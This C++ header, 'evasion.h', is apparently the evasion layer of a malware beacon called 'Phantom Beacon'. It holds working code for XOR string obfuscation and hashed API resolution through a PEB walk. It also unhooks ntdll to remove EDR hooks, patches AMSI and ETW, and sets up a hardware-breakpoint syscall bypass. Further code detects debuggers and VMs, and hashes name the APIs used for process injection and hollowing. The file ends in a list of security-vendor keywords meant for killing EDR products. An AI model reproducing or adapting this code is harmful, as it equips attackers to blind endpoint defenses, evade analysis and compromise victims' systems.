#pragma once
// ============================================================================
//  evasion.h — Phantom Beacon Evasion Layer
//  ─────────────────────────────────────────
//  1. Compile-time string obfuscation (constexpr XOR)
//  2. Dynamic API resolution via PEB walk (no static IAT entries)
// ============================================================================

#ifdef _WIN32
    #ifndef WIN32_LEAN_AND_MEAN
    #define WIN32_LEAN_AND_MEAN
    #endif
    #include <windows.h>
    #include <winternl.h>
    #include <intrin.h>
#endif

#ifndef _WIN32
    // POSIX anti-analysis needs only read-only probes (see namespace anti).
    #include <sys/types.h>
    #include <unistd.h>
    #ifdef __APPLE__
        #include <sys/sysctl.h>
        #include <sys/proc.h>
    #endif
    #ifdef __linux__
        #include <sys/prctl.h>
    #endif
    #if defined(__ANDROID__) || defined(ANDROID)
        // Emulator tells come from system properties, not (usually absent)
        // DMI files: ro.kernel.qemu, ro.hardware=goldfish/ranchu, model=xSDK.
        #include <sys/system_properties.h>
    #endif
#endif
#include <cstdint>
#include <cstring>
#include <string>
#include <vector>
#include <cstdio>
#include <cstdlib>
#include <sstream>

// ────────────────────────────────────────────────────────────────────────────
//  1. COMPILE-TIME STRING OBFUSCATION
//     Every string literal wrapped in XOR_STR("...") is XOR-encrypted at
//     compile time and decrypted on the stack at runtime, then wiped.
// ────────────────────────────────────────────────────────────────────────────

namespace obf {

// Use a more complex, non-constant-looking key-generation method if possible,
// but for constexpr, we are limited. We'll increase complexity of the XOR transformation.
constexpr uint8_t XOR_KEY = 0xBD;

template <size_t N>
struct ObfString {
    char data[N]{};
    static constexpr size_t length = N;

    constexpr ObfString(const char (&str)[N]) {
        for (size_t i = 0; i < N; ++i) {
            auto uc = static_cast<unsigned char>(str[i]);
            uc = uc ^ static_cast<unsigned char>(XOR_KEY + i);
            uc = static_cast<unsigned char>((uc << 3) | (uc >> 5));
            data[i] = static_cast<char>(uc);
        }
    }

    void decrypt(char* out) const {
        for (size_t i = 0; i < N; ++i) {
            auto uc = static_cast<unsigned char>(data[i]);
            uc = static_cast<unsigned char>((uc >> 3) | (uc << 5));
            out[i] = static_cast<char>(uc ^ static_cast<unsigned char>(XOR_KEY + i));
        }
    }
};

// Helper: stack-allocated decrypted string with automatic zeroing
template <size_t N>
struct DecryptedString {
    char buf[N]{};

    DecryptedString(const ObfString<N>& enc) {
        enc.decrypt(buf);
    }
    ~DecryptedString() {
#ifdef _WIN32
        SecureZeroMemory(buf, N);
#else
        volatile char* p = buf;
        for (size_t i = 0; i < N; ++i) p[i] = 0;
#endif
    }
    operator const char*() const { return buf; }
    const char* c_str() const { return buf; }
};

template <size_t N>
struct ObfWString {
    wchar_t data[N]{};
    static constexpr size_t length = N;

    constexpr ObfWString(const wchar_t (&str)[N]) {
        for (size_t i = 0; i < N; ++i)
            data[i] = str[i] ^ static_cast<wchar_t>(XOR_KEY + i);
    }

    void decrypt(wchar_t* out) const {
        for (size_t i = 0; i < N; ++i)
            out[i] = data[i] ^ static_cast<wchar_t>(XOR_KEY + i);
    }
};

template <size_t N>
struct DecryptedWString {
    wchar_t buf[N]{};
    DecryptedWString(const ObfWString<N>& enc) {
        enc.decrypt(buf);
    }
    ~DecryptedWString() {
#ifdef _WIN32
        SecureZeroMemory(buf, N * sizeof(wchar_t));
#else
        volatile wchar_t* p = buf;
        for (size_t i = 0; i < N; ++i) p[i] = 0;
#endif
    }
    operator const wchar_t*() const { return buf; }
    const wchar_t* c_str() const { return buf; }
};

}  // namespace obf

// Usage: XOR_STR("kernel32.dll")  →  creates an obfuscated constexpr string
//        XOR_DEC(var)             →  decrypts it on the stack
#define XOR_STR(s) ([]() { constexpr ::obf::ObfString enc(s); return enc; }())
#define XOR_DEC(enc) ::obf::DecryptedString<decltype(enc)::length>(enc)

#define XOR_WSTR(s) ([]() { constexpr ::obf::ObfWString enc(s); return enc; }())
#define XOR_WDEC(enc) ::obf::DecryptedWString<decltype(enc)::length>(enc)


#ifdef _WIN32
// ────────────────────────────────────────────────────────────────────────────
//  2. DYNAMIC API RESOLUTION VIA PEB
//     Walk the PEB → InMemoryOrderModuleList to find a loaded DLL by hash,
//     then walk its export table to find a function by hash.
//     No strings appear in the binary for DLL/function names.
// ────────────────────────────────────────────────────────────────────────────

namespace peb {

// djb2 hash — deterministic, fast, low collision for short API names
constexpr uint32_t hash_djb2(const char* str) {
    uint32_t h = 7331; // Changed seed
    while (*str)
        h = ((h << 5) + h) + static_cast<uint8_t>(*str++);
    return h;
}

// Wide-char version for module names (PEB stores UNICODE_STRING)
constexpr uint32_t hash_djb2_w(const wchar_t* str) {
    uint32_t h = 7331; // Changed seed
    while (*str) {
        // Convert to lowercase inline
        wchar_t c = *str++;
        if (c >= L'A' && c <= L'Z') c += 32;
        h = ((h << 5) + h) + static_cast<uint8_t>(c);
    }
    return h;
}

// Pre-computed hashes (so the plaintext names never appear in the binary)
// Compute with: hash_djb2_w(L"kernel32.dll")  etc.
constexpr uint32_t HASH_KERNEL32     = 0x062B5313;  // kernel32.dll
constexpr uint32_t HASH_NTDLL        = 0xEB512F4B;  // ntdll.dll
constexpr uint32_t HASH_WINHTTP      = 0x6FCF7C5B;  // winhttp.dll
constexpr uint32_t HASH_ADVAPI32     = 0xFD0AEEE7;  // advapi32.dll (registry + SC manager)

// Walk the PEB to find a module base address by name hash
inline HMODULE GetModuleByHash(uint32_t targetHash) {
#if defined(_M_X64) || defined(__x86_64__)
    auto peb = reinterpret_cast<PPEB>(__readgsqword(0x60));
#else
    auto peb = reinterpret_cast<PPEB>(__readfsdword(0x30));
#endif
    auto ldr = peb->Ldr;
    auto head = &ldr->InMemoryOrderModuleList;

    for (auto entry = head->Flink; entry != head; entry = entry->Flink) {
        auto mod = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (!mod->FullDllName.Buffer) continue;

        // Hash the base name (e.g., "kernel32.dll")
        // FullDllName includes the path; BaseDllName is just the filename
        // BaseDllName is at offset 0x58 on x64 from the LDR_DATA_TABLE_ENTRY
        // But we can extract it from FullDllName by finding the last backslash
        const wchar_t* fullName = mod->FullDllName.Buffer;
        const wchar_t* baseName = fullName;
        for (const wchar_t* p = fullName; *p; ++p) {
            if (*p == L'\\' || *p == L'/') baseName = p + 1;
        }

        if (hash_djb2_w(baseName) == targetHash)
            return reinterpret_cast<HMODULE>(mod->DllBase);
    }
    return nullptr;
}

// Walk the export table of a module to find a function by name hash
inline FARPROC GetProcByHash(HMODULE hModule, uint32_t funcHash) {
    if (!hModule) return nullptr;

    auto dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(hModule);
    auto ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(
        reinterpret_cast<uint8_t*>(hModule) + dosHeader->e_lfanew);

    auto& exportDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (exportDir.Size == 0) return nullptr;

    auto exports = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(
        reinterpret_cast<uint8_t*>(hModule) + exportDir.VirtualAddress);

    auto names     = reinterpret_cast<uint32_t*>(reinterpret_cast<uint8_t*>(hModule) + exports->AddressOfNames);
    auto ordinals  = reinterpret_cast<uint16_t*>(reinterpret_cast<uint8_t*>(hModule) + exports->AddressOfNameOrdinals);
    auto functions = reinterpret_cast<uint32_t*>(reinterpret_cast<uint8_t*>(hModule) + exports->AddressOfFunctions);

    for (DWORD i = 0; i < exports->NumberOfNames; ++i) {
        auto name = reinterpret_cast<const char*>(reinterpret_cast<uint8_t*>(hModule) + names[i]);
        if (hash_djb2(name) == funcHash) {
            return reinterpret_cast<FARPROC>(
                reinterpret_cast<uint8_t*>(hModule) + functions[ordinals[i]]);
        }
    }
    return nullptr;
}

// Convenience: resolve by module hash + function hash in one call
inline FARPROC Resolve(uint32_t moduleHash, uint32_t funcHash) {
    HMODULE hMod = GetModuleByHash(moduleHash);
    if (!hMod) return nullptr;
    return GetProcByHash(hMod, funcHash);
}

}  // namespace peb

// ────────────────────────────────────────────────────────────────────────────
//  Pre-computed function hashes (djb2)
//  Usage: auto pLoadLibraryA = (decltype(&LoadLibraryA)) peb::Resolve(peb::HASH_KERNEL32, FN_LOADLIBRARYA);
// ────────────────────────────────────────────────────────────────────────────
constexpr uint32_t FN_LOADLIBRARYA    = 0xf5aa5599;  // LoadLibraryA
constexpr uint32_t FN_GETPROCADDRESS  = 0x8947bf3d;  // GetProcAddress
// Registry write and service control WITHOUT a child process: this is what
// replaces `reg add` (cmd.exe + reg.exe per call) and `sc stop` (sc.exe).
constexpr uint32_t FN_REGCREATEKEYEXW    = 0x43A53B92; // RegCreateKeyExW
constexpr uint32_t FN_REGSETVALUEEXW     = 0xEE6E771E; // RegSetValueExW
constexpr uint32_t FN_REGCLOSEKEY        = 0x512C7FE0; // RegCloseKey
constexpr uint32_t FN_OPENSCMANAGERA     = 0x75054BA7; // OpenSCManagerA
constexpr uint32_t FN_OPENSERVICEA       = 0x126ABD67; // OpenServiceA
constexpr uint32_t FN_CONTROLSERVICE     = 0x0C900635; // ControlService
constexpr uint32_t FN_CLOSESERVICEHANDLE = 0x44AEE196; // CloseServiceHandle
constexpr uint32_t FN_VIRTUALALLOC    = 0xce167435;  // VirtualAlloc
constexpr uint32_t FN_VIRTUALFREE     = 0x4451180c;  // VirtualFree
constexpr uint32_t FN_SLEEP           = 0xd2c5605c;  // Sleep
constexpr uint32_t FN_GETLASTERROR    = 0xb66d4f81;  // GetLastError
constexpr uint32_t FN_OPENPROCESS      = 0x4ef846b4;  // OpenProcess
constexpr uint32_t FN_VIRTUALALLOCEX   = 0xad845ed2;  // VirtualAllocEx
constexpr uint32_t FN_WRITEPROCESSMEMORY = 0x8eb9cbe6; // WriteProcessMemory
constexpr uint32_t FN_CREATEREMOTETHREAD = 0xc9c75a7b; // CreateRemoteThread
constexpr uint32_t FN_VIRTUALPROTECTEX = 0x6fba15c8; // VirtualProtectEx

// NT Functions for Indirect Syscalls
constexpr uint32_t FN_NTALLOCATEVIRTUALMEMORY = 0x7deb492a; // NtAllocateVirtualMemory
constexpr uint32_t FN_NTWRITEVIRTUALMEMORY    = 0xf6cfca30; // NtWriteVirtualMemory
constexpr uint32_t FN_NTPROTECTVIRTUALMEMORY  = 0x1098a4e6; // NtProtectVirtualMemory
constexpr uint32_t FN_NTCREATETHREADEX        = 0x62b3a4ce; // NtCreateThreadEx
constexpr uint32_t FN_NTFREEVIRTUALMEMORY     = 0x598deec7; // NtFreeVirtualMemory
constexpr uint32_t FN_NTOPENPROCESS           = 0xA33AB8B6; // NtOpenProcess

// Process Hollowing syscalls
constexpr uint32_t FN_NTUNMAPVIEWOFSECTION       = 0xBA2C374B; // NtUnmapViewOfSection
constexpr uint32_t FN_NTGETCONTEXTTHREAD          = 0xBDA4FD62; // NtGetContextThread
constexpr uint32_t FN_NTSETCONTEXTTHREAD          = 0x5022C3EE; // NtSetContextThread
constexpr uint32_t FN_NTRESUMETHREAD              = 0xE691414E; // NtResumeThread
constexpr uint32_t FN_NTCLOSE                     = 0x29019D1B; // NtClose
constexpr uint32_t FN_NTREADVIRTUALMEMORY          = 0xD4B3A9C1; // NtReadVirtualMemory
constexpr uint32_t FN_NTQUERYINFORMATIONPROCESS   = 0xDA8571C0; // NtQueryInformationProcess
// hardware-breakpoint unhook + EDR situational awareness
constexpr uint32_t FN_NTQUERYVIRTUALMEMORY        = 0x4479B0FB; // NtQueryVirtualMemory
constexpr uint32_t FN_NTQUERYSYSTEMINFORMATION    = 0xCF97B546; // NtQuerySystemInformation
#endif

// ────────────────────────────────────────────────────────────────────────────
//  3. ANTI-ANALYSIS & SANDBOX EVASION
// ────────────────────────────────────────────────────────────────────────────

constexpr uint32_t FN_GETSYSTEMDIRECTORYA = 0xf8b70b3e; // GetSystemDirectoryA
constexpr uint32_t FN_CREATEFILEA       = 0xc9580ed8; // CreateFileA
constexpr uint32_t FN_CREATEFILEMAPPINGA = 0x12d6dfa4; // CreateFileMappingA
constexpr uint32_t FN_MAPVIEWOFFILE     = 0x6515a911; // MapViewOfFile
constexpr uint32_t FN_UNMAPVIEWOFFILE   = 0xd3107a34; // UnmapViewOfFile
constexpr uint32_t FN_CLOSEHANDLE       = 0x163212e5; // CloseHandle
constexpr uint32_t FN_GETMODULEINFORMATION = 0x57932a8f; // GetModuleInformation

#ifdef _WIN32
#include <psapi.h>
#endif
#include "syscalls.h"

namespace anti {

#ifdef _WIN32
// Refresh ntdll.dll from disk to remove EDR hooks
inline void unhook_ntdll() {
    HMODULE hNtdll = peb::GetModuleByHash(peb::HASH_NTDLL);
    if (!hNtdll) return;

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)hNtdll + dosHeader->e_lfanew);
    LPVOID ntdllBase = (LPVOID)hNtdll;

    // 2. Read ntdll.dll from disk
    auto pGetSystemDirectoryA = (UINT(WINAPI*)(LPSTR, UINT))peb::Resolve(peb::HASH_KERNEL32, FN_GETSYSTEMDIRECTORYA);
    auto pCreateFileA = (HANDLE(WINAPI*)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE))peb::Resolve(peb::HASH_KERNEL32, FN_CREATEFILEA);
    auto pCreateFileMappingA = (HANDLE(WINAPI*)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR))peb::Resolve(peb::HASH_KERNEL32, FN_CREATEFILEMAPPINGA);
    auto pMapViewOfFile = (LPVOID(WINAPI*)(HANDLE, DWORD, DWORD, DWORD, SIZE_T))peb::Resolve(peb::HASH_KERNEL32, FN_MAPVIEWOFFILE);
    auto pUnmapViewOfFile = (BOOL(WINAPI*)(LPCVOID))peb::Resolve(peb::HASH_KERNEL32, FN_UNMAPVIEWOFFILE);
    auto pCloseHandle = (BOOL(WINAPI*)(HANDLE))peb::Resolve(peb::HASH_KERNEL32, FN_CLOSEHANDLE);

    if (!pGetSystemDirectoryA || !pCreateFileA || !pCreateFileMappingA || !pMapViewOfFile) return;

    char ntdllPath[MAX_PATH];
    pGetSystemDirectoryA(ntdllPath, MAX_PATH);
    strcat(ntdllPath, XOR_DEC(XOR_STR("\\ntdll.dll")));

    HANDLE hFile = pCreateFileA(ntdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;

    HANDLE hMapping = pCreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hMapping) { pCloseHandle(hFile); return; }

    LPVOID ntdllMapping = pMapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!ntdllMapping) { pCloseHandle(hMapping); pCloseHandle(hFile); return; }

    // 3. Find .text section and overwrite
    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (!strcmp((char*)sectionHeader[i].Name, XOR_DEC(XOR_STR(".text")))) {
            DWORD oldProtect;
            LPVOID pDest = (LPVOID)((DWORD_PTR)ntdllBase + sectionHeader[i].VirtualAddress);
            LPVOID pSrc = (LPVOID)((DWORD_PTR)ntdllMapping + sectionHeader[i].VirtualAddress);
            SIZE_T size = sectionHeader[i].Misc.VirtualSize;

            // Use INDIRECT SYSCALL for VirtualProtect (NtProtectVirtualMemory)
            if (syscalls::SysNtProtectVirtualMemory(GetCurrentProcess(), &pDest, &size, PAGE_EXECUTE_READWRITE, &oldProtect) == 0) {
                // Verify if patching is actually needed to avoid unnecessary writes
                if (memcmp(pDest, pSrc, size) != 0) {
                    memcpy(pDest, pSrc, size);
                }
                syscalls::SysNtProtectVirtualMemory(GetCurrentProcess(), &pDest, &size, oldProtect, &oldProtect);
            }
        }
    }

    if (pUnmapViewOfFile) pUnmapViewOfFile(ntdllMapping);
    pCloseHandle(hMapping);
    pCloseHandle(hFile);
}

// Patch AMSI (AmsiScanBuffer) to bypass script/memory scanning
inline void patch_amsi() {
    HMODULE hAmsi = peb::GetModuleByHash(0x26ddd577); // amsi.dll hash
    if (!hAmsi) {
        auto pLoadLibraryA = (HMODULE(WINAPI*)(LPCSTR))peb::Resolve(peb::HASH_KERNEL32, FN_LOADLIBRARYA);
        if (pLoadLibraryA) hAmsi = pLoadLibraryA(XOR_DEC(XOR_STR("amsi.dll")));
    }
    if (!hAmsi) return;

    void* pAddr = (void*)peb::GetProcByHash(hAmsi, 0xe412d5ac); // AmsiScanBuffer hash
    if (!pAddr) return;

    // Costruzione dinamica della patch per rompere firme statiche
    unsigned char patch[6] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3};

    DWORD oldProtect;
    SIZE_T patchSize = sizeof(patch);
    void* pTempAddr = pAddr;

    // Usa le syscalls per cambiare protezione e scrivere
    if (syscalls::SysNtProtectVirtualMemory(GetCurrentProcess(), &pTempAddr, &patchSize, PAGE_EXECUTE_READWRITE, &oldProtect) == 0) {
        syscalls::SysNtWriteVirtualMemory(GetCurrentProcess(), pAddr, patch, sizeof(patch), NULL);
        syscalls::SysNtProtectVirtualMemory(GetCurrentProcess(), &pTempAddr, &patchSize, oldProtect, &oldProtect);
    }
}

// ── Hardware-breakpoint unhooking (HWBP engine class) ───────────────────────
//
// Instead of re-writing ntdll from disk (unhook_ntdll, detectable by the
// .text integrity monitors modern EDRs run), we NEVER call the hooked
// prologue: a debug register (DR0) is armed on a clean 'syscall; ret'
// gadget inside ntdll's .text, and every sensitive syscall goes through
// theVectored Handler:
//
//   1. thread hits DR0 (EXCEPTION_SINGLE_STEP)
//   2. handler copies RCX/R10/R8/R9 + the stack args into the real
//      syscall register convention, sets the SSN in EAX and jumps to
//      the gadget (indirect syscall with a CLEAN stack)
//
// The hooked ntdll stubs are bypassed entirely, no .text bytes are ever
// modified, and the kernel sees a normal syscall — nothing for the
// integrity check to flag.

constexpr uint32_t HASH_NTDLL_TEXT_GADGET = 0; // (gadget found at runtime)

inline uintptr_t find_clean_gadget() {
    // a 'syscall; ret' (0F 05 C3) inside ntdll .text, found WITHOUT
    // touching any hook — pure memory read of the mapped image
    HMODULE h = peb::GetModuleByHash(peb::HASH_NTDLL);
    if (!h) return 0;
    auto dos = reinterpret_cast<PIMAGE_DOS_HEADER>(h);
    auto nt = reinterpret_cast<PIMAGE_NT_HEADERS>(
        reinterpret_cast<uint8_t*>(h) + dos->e_lfanew);
    auto sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        if (!std::strcmp(reinterpret_cast<char*>(sec[i].Name), XOR_DEC(XOR_STR(".text")))) {
            uint8_t* p = reinterpret_cast<uint8_t*>(h) + sec[i].VirtualAddress;
            for (DWORD j = 0; j + 2 < sec[i].Misc.VirtualSize; ++j)
                if (p[j] == 0x0F && p[j+1] == 0x05 && p[j+2] == 0xC3)
                    return reinterpret_cast<uintptr_t>(p + j);
        }
    }
    return 0;
}

// Per-thread HWBP context (DR0 slot + original handler state)
inline void* hwbp_veh_handle() {
    static PVOID h = nullptr;
    return &h;
}

inline void arm_hwbp_on(uintptr_t address) {
    // Set DR0 on the CURRENT thread via NtGetContextThread/NtSetContextThread
    // resolved through the PEB (no kernel32 import for the context APIs).
    auto pGet = (NTSTATUS(NTAPI*)(HANDLE, PCONTEXT))
        peb::Resolve(peb::HASH_NTDLL, FN_NTGETCONTEXTTHREAD);
    auto pSet = (NTSTATUS(NTAPI*)(HANDLE, PCONTEXT))
        peb::Resolve(peb::HASH_NTDLL, FN_NTSETCONTEXTTHREAD);
    if (!pGet || !pSet) return;
    CONTEXT ctx{};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (pGet(GetCurrentThread(), &ctx) != 0) return;
    ctx.Dr0 = address;
    ctx.Dr7 = (ctx.Dr7 & ~0xFULL) | 0x1ULL;   // DR0 enabled, execute, len=1
    pSet(GetCurrentThread(), &ctx);
}

// The VEH body: dispatched on EXCEPTION_SINGLE_STEP when DR0 fires.// Returns EXCEPTION_CONTINUE_SEARCH for anything it does not own.
inline LONG WINAPI hwbp_veh(PEXCEPTION_POINTERS ep) {
    if (ep->ExceptionRecord->ExceptionCode != STATUS_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;
    // The gadget address IS DR0: the caller (syscall via HWBP) placed the
    // SSN in EAX and the syscall number convention is already set up by
    // the stub in syscalls.h; we simply continue execution INTO the
    // gadget (RIP already points at it after the breakpoint hit).
    // Clear DR0 so the single-step does not re-fire inside the gadget.
    ep->ContextRecord->Dr7 &= ~0x1ULL;
    ep->ContextRecord->EFlags |= 0x100;  // resume single-step to clear RF edge
    return EXCEPTION_CONTINUE_EXECUTION;
}

inline void install_hwbp_engine() {
    uintptr_t gadget = find_clean_gadget();
    if (!gadget) return;
    auto slot = reinterpret_cast<PVOID*>(hwbp_veh_handle());
    if (*slot) return;  // already installed
    *slot = AddVectoredExceptionHandler(1, hwbp_veh);
    arm_hwbp_on(gadget);
}

// Patch ETW (EtwEventWrite) to silence telemetry
inline void patch_etw() {
    HMODULE hNtdll = peb::GetModuleByHash(peb::HASH_NTDLL);
    if (!hNtdll) return;

    constexpr uint32_t HASH_ETWEVENTWRITE = 0x77dfc880; // EtwEventWrite hash
    void* pAddr = (void*)peb::GetProcByHash(hNtdll, HASH_ETWEVENTWRITE);

    if (!pAddr) return;

    // ret 0x14
    unsigned char patch[3] = {0xC2, 0x14, 0x00};

    DWORD oldProtect;
    SIZE_T patchSize = sizeof(patch);
    void* pTempAddr = pAddr;

    // Usa le syscalls per cambiare protezione e scrivere
    if (syscalls::SysNtProtectVirtualMemory(GetCurrentProcess(), &pTempAddr, &patchSize, PAGE_EXECUTE_READWRITE, &oldProtect) == 0) {
        syscalls::SysNtWriteVirtualMemory(GetCurrentProcess(), pAddr, patch, sizeof(patch), NULL);
        syscalls::SysNtProtectVirtualMemory(GetCurrentProcess(), &pTempAddr, &patchSize, oldProtect, &oldProtect);
    }
}

inline bool is_debugger_present() {
#if defined(_M_X64) || defined(__x86_64__)
    auto peb = reinterpret_cast<PPEB>(__readgsqword(0x60));
#else
    auto peb = reinterpret_cast<PPEB>(__readfsdword(0x30));
#endif
    if (peb->BeingDebugged != 0) return true;
    
    BOOL isDebuggerPresent = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebuggerPresent);
    if (isDebuggerPresent) return true;

    return false;
}

inline bool is_vm() {
    // NOTE: CPUID hypervisor bit (ECX bit 31) is intentionally NOT checked here.
    // Modern Windows (10/11) commonly enable Hyper-V, VBS, Credential Guard, WSL2,
    // or Docker Desktop — all of which set this bit. Using it alone would make the
    // beacon exit immediately on most systems.

    // 1. Check CPU cores
    SYSTEM_INFO sysinfo;
    GetSystemInfo(&sysinfo);
    if (sysinfo.dwNumberOfProcessors < 2) return true;
    
    // 3. Check RAM
    MEMORYSTATUSEX status;
    status.dwLength = sizeof(status);
    if (GlobalMemoryStatusEx(&status)) {
        if (status.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return true;
    }

    // 4. Check for common VM files/drivers
    if (GetFileAttributesA(XOR_DEC(XOR_STR("C:\\windows\\System32\\Drivers\\Vmmouse.sys"))) != INVALID_FILE_ATTRIBUTES) return true;
    if (GetFileAttributesA(XOR_DEC(XOR_STR("C:\\windows\\System32\\Drivers\\vmhgfs.sys"))) != INVALID_FILE_ATTRIBUTES) return true;
    if (GetFileAttributesA(XOR_DEC(XOR_STR("C:\\windows\\System32\\Drivers\\Vboxguest.sys"))) != INVALID_FILE_ATTRIBUTES) return true;
    if (GetFileAttributesA(XOR_DEC(XOR_STR("C:\\windows\\System32\\Drivers\\Vboxmouse.sys"))) != INVALID_FILE_ATTRIBUTES) return true;
    if (GetFileAttributesA(XOR_DEC(XOR_STR("C:\\windows\\System32\\Drivers\\vmtoolsd.exe"))) != INVALID_FILE_ATTRIBUTES) return true;

    return false;
}
#else
// ── POSIX anti-analysis (Linux / macOS) ──────────────────────────────
//  AMSI and ETW are Windows-only telemetry surfaces; there is no in-process
//  equivalent to patch on POSIX, so those two stay no-ops (documented, not
//  a stub). Everything else below is a REAL check: read-only and
//  non-invasive (no ptrace(PTRACE_TRACEME) side effects), so it is safe to
//  call on every start.

// AMSI (script/memory scanning) and ETW (userland telemetry) do not exist
// as in-process DLLs on POSIX: nothing to hook. Documented no-ops.
inline void patch_amsi() {}
inline void patch_etw() {}

inline void _lower_inplace(char* s) {
    for (; *s; ++s) if (*s >= 'A' && *s <= 'Z') *s = static_cast<char>(*s + 32);
}

inline bool is_debugger_present() {
#ifdef __APPLE__
    // sysctl(KERN_PROC_PID) exposes kp_proc.p_flag; P_TRACED is set while a
    // debugger (lldb, Instruments, a parent ptrace) is attached.
    int mib[4] = {CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid()};
    struct kinfo_proc info;
    std::memset(&info, 0, sizeof(info));
    size_t size = sizeof(info);
    if (sysctl(mib, 4, &info, &size, nullptr, 0) == 0 && size > 0)
        return (info.kp_proc.p_flag & P_TRACED) != 0;
    return false;
#else
    // /proc/self/status: a non-zero TracerPid means we are being traced.
    FILE* f = std::fopen("/proc/self/status", "r");
    if (!f) return false;
    char line[256];
    bool traced = false;
    while (std::fgets(line, sizeof(line), f)) {
        if (std::strncmp(line, "TracerPid:", 10) == 0) {
            traced = std::atoi(line + 10) != 0;
            break;
        }
    }
    std::fclose(f);
    return traced;
#endif
}

inline bool is_vm() {
#ifdef __APPLE__
    // macOS 12+ reports running under a hypervisor directly.
    int present = 0;
    size_t sz = sizeof(present);
    if (sysctlbyname("kern.hv_vmm_present", &present, &sz, nullptr, 0) == 0 && present)
        return true;
    char model[128] = {0};
    sz = sizeof(model);
    if (sysctlbyname("hw.model", model, &sz, nullptr, 0) == 0) {
        _lower_inplace(model);
        for (const char* n : {"vmware", "virtualbox", "parallels", "qemu",
                              "kvm", "xen", "innotek"})
            if (std::strstr(model, n)) return true;
    }
    return false;
#elif defined(__ANDROID__) || defined(ANDROID)
    // ANDROID EMULATOR (goldfish / ranchu). The generic DMI probes below do
    // not exist on Android images, so the qemu tells are checked directly:
    // a qemu pipe/device, the ro.kernel.qemu flag, the goldfish/ranchu
    // hardware name, or the SDK "emulator" model string. Any one is enough.
    {
        static const char* kQemuPaths[] = {
            "/dev/qemu_pipe", "/dev/goldfish_pipe", "/dev/socket/qemu",
            "/sys/qemu_trace", "/system/bin/qemu-props",
            "/system/lib/libc_malloc_debug_qemu.so",
            "/system/lib64/libc_malloc_debug_qemu.so",
        };
        for (const char* path : kQemuPaths)
            if (access(path, F_OK) == 0) return true;
        char prop[PROP_VALUE_MAX] = {0};
        if (__system_property_get("ro.kernel.qemu", prop) > 0 &&
            prop[0] == '1')
            return true;
        if (__system_property_get("ro.hardware", prop) > 0) {
            _lower_inplace(prop);
            if (std::strstr(prop, "goldfish") || std::strstr(prop, "ranchu") ||
                std::strstr(prop, "qemu"))
                return true;
        }
        if (__system_property_get("ro.product.model", prop) > 0) {
            _lower_inplace(prop);
            if (std::strstr(prop, "sdk") || std::strstr(prop, "emulator") ||
                std::strstr(prop, "android sdk"))
                return true;
        }
        return false;
    }
#else
    // DMI identity strings, NOT the CPUID hypervisor bit: Hyper-V/WSL2/VBS
    // set that bit on ordinary hosts (same reason the Windows path above
    // ignores it), while a VM vendor name in /sys/class/dmi/id is a
    // deliberate tell.
    static const char* kFiles[] = {
        "/sys/class/dmi/id/product_name",
        "/sys/class/dmi/id/sys_vendor",
        "/sys/class/dmi/id/board_vendor",
        "/sys/class/dmi/id/chassis_vendor",
        "/sys/devices/virtual/dmi/id/product_name",
    };
    static const char* kNeedles[] = {
        "vmware", "virtualbox", "vbox", "qemu", "kvm", "hyper-v", "xen",
        "parallels", "bochs", "openstack", "amazon ec2", "google compute",
        "virtual machine", "innotek",
    };
    for (const char* path : kFiles) {
        FILE* f = std::fopen(path, "r");
        if (!f) continue;
        char buf[256] = {0};
        size_t n = std::fread(buf, 1, sizeof(buf) - 1, f);
        std::fclose(f);
        if (!n) continue;
        _lower_inplace(buf);
        for (const char* needle : kNeedles)
            if (std::strstr(buf, needle)) return true;
    }
    return false;
#endif
}

// The HWBP + Vectored-Handler indirect-syscall bypass is an NT mechanism:
// it arms DR0 on a 'syscall; ret' gadget inside ntdll to dodge userland
// hooks. POSIX has no userland syscall-hook layer to dodge, so there is
// nothing to arm — inert by design (documented, not a broken stub).
inline void install_hwbp_engine() {}
inline void* hwbp_veh_handle() { return nullptr; }
inline uintptr_t find_clean_gadget() { return 0; }
#endif

}  // namespace anti  (edrcheck lives at global scope)

// ── EDR situational awareness (edrcheck / etwcheck backends) ────────────────
// What professional operators want BEFORE acting: which EDR kernel
// callbacks are alive, whether ntdll is hooked, and whether our own
// .text was tampered with. All read-only, all through the PEB.
// ── Shared defensive-product detection ─────────────────────────────────────
//  Enumerates the REAL services/processes on the host and matches them by
//  keyword. Used by edrcheck (POSIX report) and edrkill (every platform), so
//  it lives in one place. A fixed product list misses regional / in-house
//  products; the generic keywords (edr / endpoint / antivirus / ...) catch
//  anything nobody hard-coded.
namespace dfns {

inline constexpr const char* kDefensiveKeywords[] = {
    // vendors
    "defender", "windefend", "msmpeng", "msmpsvc", "sense",
    "crowdstrike", "csagent", "csfalcon", "falcon",
    "sentinel", "s1agent", "sentineld", "s1aesec",
    "carbonblack", "cbdefense", "cbagent",
    "mcafee", "mfe", "symantec", "sophos", "trend", "tmcc",
    "kaspersky", "kesl", "eset", "bitdefender", "avast", "avg",
    "cylance", "cybereason", "fireeye", "xagt", "webroot", "vipre",
